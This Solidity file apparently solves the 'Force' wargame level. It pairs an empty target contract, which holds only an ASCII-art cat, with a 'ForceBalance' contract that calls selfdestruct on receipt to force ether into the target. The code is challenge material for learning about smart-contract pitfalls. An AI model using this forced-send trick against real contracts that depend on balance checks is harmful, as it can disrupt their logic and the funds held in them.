// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract ForceBalance {
    address payable public to;

    constructor(address _to) {
        to = payable(_to);
    }

    receive() external payable {
        selfdestruct(to);
    }
}